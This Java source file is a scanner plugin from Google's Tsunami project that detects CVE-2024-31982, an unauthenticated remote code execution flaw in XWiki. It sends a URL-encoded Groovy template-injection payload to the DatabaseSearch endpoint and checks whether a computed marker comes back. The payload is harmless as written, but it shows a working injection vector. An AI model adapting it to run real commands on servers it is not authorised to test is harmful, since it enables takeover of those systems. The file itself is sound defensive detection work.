/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202431982;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects a remote code execution vulnerability in xwiki. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2024-31982 detector",
    version = "0.1",
    description = "Detects remote code execution vulnerability in xwiki",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = Cve202431982BootstrapModule.class)
public final class Cve202431982Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final ImmutableList<String> POSSIBLE_SUBPATHS = ImmutableList.of("", "xwiki/");
  // Decoded payload: '}}}{{async
  // async=false}}{{groovy}}println("tsunami-detection:"+(2001+1024)){{/groovy}}{{/async}}'
  // This will print 'tsunami-detection:3025' in the output.
  private static final String PAYLOAD =
      "%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22tsunami%2Ddetection%3A%22%2B%282001%2B1024%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D";
  private static final String TARGET_PATH = "bin/get/Main/DatabaseSearch?outputSyntax=plain&text=";

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  Cve202431982Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().build();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection: CVE-2024-31982 in xwiki");
    DetectionReportList detectionReports =
        DetectionReportList.newBuilder()
            .addAllDetectionReports(
                matchedServices.stream()
                    .filter(NetworkServiceUtils::isWebService)
                    .filter(this::isServiceVulnerable)
                    .map(networkService -> buildDetectionReport(targetInfo, networkService))
                    .collect(toImmutableList()))
            .build();

    logger.atInfo().log(
        "Detection for CVE-2024-31982 finished, detected '%d' vulns.",
        detectionReports.getDetectionReportsCount());
    return detectionReports;
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE-2024-31982"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2024-31982"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("xwiki instance vulnerable to CVE-2024-31982")
            .setRecommendation(
                "Update to one of the patched versions of xwiki: 14.10.20, 15.5.4, 15.10-rc-1")
            .setDescription(
                "The xwiki instance is vulnerable to CVE-2024-31982. This vulnerability allows"
                    + " an attacker to take control of the xwiki instance and does not require"
                    + " authentication.")
            .build());
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    return POSSIBLE_SUBPATHS.stream()
        .anyMatch(endpoint -> isEndpointVulnerable(networkService, endpoint));
  }

  private boolean isEndpointVulnerable(NetworkService networkService, String subpath) {
    String targetUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + subpath
            + TARGET_PATH
            + PAYLOAD;

    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetUrl).withEmptyHeaders().build(), networkService);
      return (httpResponse.status().code() == 200
          && httpResponse.bodyString().get().contains("tsunami-detection:3025"));
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request to %s", targetUrl);
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo scannedTarget, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(scannedTarget)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
